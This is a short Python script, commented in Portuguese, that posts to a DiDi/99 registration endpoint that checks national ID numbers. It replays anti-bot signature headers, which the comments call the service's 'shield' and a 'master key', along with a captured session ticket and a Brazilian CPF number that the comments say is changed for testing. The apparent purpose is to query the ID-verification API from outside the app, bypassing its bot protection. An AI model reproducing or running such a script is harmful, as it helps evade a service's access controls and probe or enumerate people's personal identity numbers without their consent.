import asyncio
import httpx

async def testar_api_99():
    print("🚀 Iniciando disparo contra a API da 99...\n")
    
    url = 'https://mis.didiglobal.com/gulfstream/deadpool/register/checkIdNo'
    
    # Cabeçalhos com a sua "Chave Mestra" e disfarce de celular
    headers = {
        'Accept-Language': 'pt-BR,pt;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://page.99app.com',
        'Referer': 'https://page.99app.com/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'secdd-authentication': '1773103826',
        'secdd-challenge': '4|1.5.14||||||',
        # O escudo anti-bot deles:
        'wsgsig': 'dd05-0EpfwmrED/CYKqt5HftE41cn+1djK7enMG2kje9dqBiAqhgI7XD6KhUmcLeab1EFu+I1QGOwxDOZ6knZNdcwG4bybMe0C6Vu1b2H/eFHXdXPpUiENjck7XdvEM//FIAdP865n0HYuGxk+VtB9es/F6jjf5dXaNduCbHLiDqVTDsUnVckJjsr2ta06NVla5aaPKH2ZFOBWDL66XgI4Fn2BLcbS2UcRdBK6Cy1d2reAdEYzOWFbYEF3jaKG3thAMlayNMTSCMwOBZV2/WP8Ai919spgMki8Jqu1cS9lf/BlAXOyU09Jjt/8XhyHL/xeIeIy759vCMOxC1L+mCeNeDLG4DXe2rtMK/y40PhzflI/d0PSVsB2miH+jkQfMVab5/LR76Yj0O/kC1P6knxegjA44D0g1hm78BycgZA/CFwrdCwurEO0mmq+hbJgMlZ35AA/2MAm029xDHH/jf91aDrP3cva2BQ179f5bPhsfEOXBbwuVsLH/Dk3hkogJlra59EP7M5j0OSzCOY/jf9IaDrP3cva2BQ179f6bZBqgdOUCt9YVsANiiH7kUtwJkwCLhAidTL/01SvDHrFkXB+ejLN3cja7ri58quGbIIXfV6K0jP/rCUIibH+teyKIFTf6qHR5M5p0OwYDHxElnx8GsBcMGfe3kjIJApI0P1kDV5rBCEZV0dcXGYEXdgALVxeIFBx8MYi'
    }
    
    # O corpo da requisição (AQUI VAI O CPF E O SEU TICKET ETERNO)
    data = {
        'a': '102935043',
        'activity_id': '102935043',
        'activity_type': '29',
        'channel': '28',
        'city_id': '55000272',
        'i': '-GxOz-DRcr-0uQsyNmPeyA==',
        'lang': 'pt-BR',
        'locale': 'pt_BR',
        'location_country': 'BR',
        'product_id': '16',
        'scene': '29',
        'shar_chanl': 'wa',
        'uid': '650911144863765',
        'url_id': '1232973489',
        'url_type': '0',
        'ticket': 'cNyD65Zav9JuVTm7w-RGy2s_y6DAdYrOCRiFzmrj138syzEKAkEMQNG7_NawJGsmY1J6BI-groLFCIrVsncXxP69laEU-0knRRhGmTBmqquaC6NRHE8IZyqapllGuMehu3D98YVaeT8_r8vyf5two6x3S_doIdwpdq1lZA910zCEBzVv3wAAAP__',
        'identity': '3',
        # 🎯 MUDAMOS O CPF AQUI PARA TESTAR!
        'value': '61804765311', 
        'end': 'WebEnd',
        'oid': 'e77f3588-8229-4c34-985f-208037932db0',
        'product': '4'
    }

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, headers=headers, data=data)
            print(f"Status Code: {response.status_code}")
            print("Resposta do Servidor 99:")
            print(response.text)
        except Exception as e:
            print(f"Erro na requisição: {e}")

if __name__ == "__main__":
    asyncio.run(testar_api_99())